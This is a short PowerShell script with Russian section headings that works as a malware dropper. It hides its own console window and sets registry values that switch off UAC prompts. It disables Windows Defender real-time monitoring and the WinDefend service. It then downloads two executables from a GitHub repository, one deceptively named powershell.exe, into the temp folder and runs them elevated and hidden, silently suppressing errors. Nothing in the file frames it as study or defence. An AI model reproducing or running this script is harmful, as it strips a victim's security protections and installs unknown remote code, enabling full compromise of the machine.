
# ==================== СКРЫТИЕ ====================
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$hwnd = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($hwnd, 0)

# ==================== ОТКЛЮЧЕНИЕ UAC ====================
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f 2>$null

# ==================== ОТКЛЮЧЕНИЕ DEFENDER ====================
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring 1" 2>$null
sc stop WinDefend 2>$null
sc config WinDefend start=disabled 2>$null

# ==================== СКАЧИВАНИЕ И ЗАПУСК ОТ АДМИНА ====================
$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")

$files = @(
    "https://github.com/sys1e/catl/raw/refs/heads/main/powershell.exe",
    "https://github.com/sys1e/catl/raw/refs/heads/main/Ret.exe"
)

foreach ($url in $files) {
    $name = $url.Split("/")[-1]
    $path = "$env:TEMP\$name"
    try {
        $wc.DownloadFile($url, $path)
        Start-Process $path -Verb RunAs -WindowStyle Hidden
    } catch {}
}

# ==================== ВЫХОД ====================
exit